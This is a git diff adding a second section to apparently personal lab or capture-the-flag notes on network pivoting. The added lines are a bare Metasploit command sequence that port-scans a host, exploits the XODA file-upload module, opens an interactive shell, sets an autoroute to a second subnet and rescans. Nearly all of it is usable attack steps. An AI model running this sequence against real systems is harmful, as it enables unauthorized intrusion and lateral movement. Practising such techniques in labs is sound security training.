@@ -1,5 +1,5 @@
 **Pivoting**
-
+1)
 ```
 Victim Machine 1 : 10.0.18.105
 Victim Machine 2 : 10.0.24.43
@@ -36,3 +36,42 @@ cd C:\
 dir
 type flag.txt
 ```
+2)
+```
+ip a s
+service postgresql start && msfconsole
+db_status
+workspace
+search portscan
+use auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS 192.149.33.3
+show options
+run
+curl 192.149.33.3
+search xoda
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS 192.149.33.3
+set  TARGETURI /
+show options
+run
+sysinfo
+shell
+bin/bash -i
+ip a s
+ctrl+c
+sysinfo
+run autoroute -s 192.9.21.2
+sessions 
+search portscan
+use  auxiliary/scanner/portscan/tcp
+set RHOSTS 192.149.33.3
+show options
+run
+
+
+```
+
+
+
+
